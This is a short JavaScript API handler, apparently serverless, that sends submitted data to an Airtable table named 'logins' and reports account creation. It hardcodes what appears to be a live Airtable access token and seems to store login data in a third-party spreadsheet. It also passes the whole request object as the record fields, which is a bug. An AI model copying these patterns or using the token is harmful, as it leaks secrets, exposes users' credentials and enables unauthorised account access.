export default async function handler(req, res) {
  //const {username, password} = req.body;

  const myHeaders = new Headers();
  myHeaders.append("Authorization", "Bearer patFPAzk3Ni4jtL7K.8bdcda86e17b32bd177f9ab25661e401e4454a8e4a2401a267c36b67e94ea933");
  myHeaders.append("Content-Type", "application/json");

  const raw = JSON.stringify({
    "records": [
      {
        "fields": req
      }
    ]
  }, null , 2);

  const requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow"
  };

  try {
    const response = await fetch("https://api.airtable.com/v0/appXXbVu5p4uSKViT/logins", requestOptions);

    // Check if the response is successful (status code 200-299)
    if (!response.ok) {
      const errorData = await response.json();
      return res.status(500).json({ message: "Airtable API Error", error: errorData });
    }

    const result = await response.json();
    return res.status(200).json({ message: "Account created successfully", data: result });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({ message: "Internal Server Error", error: error.message });
  }
}
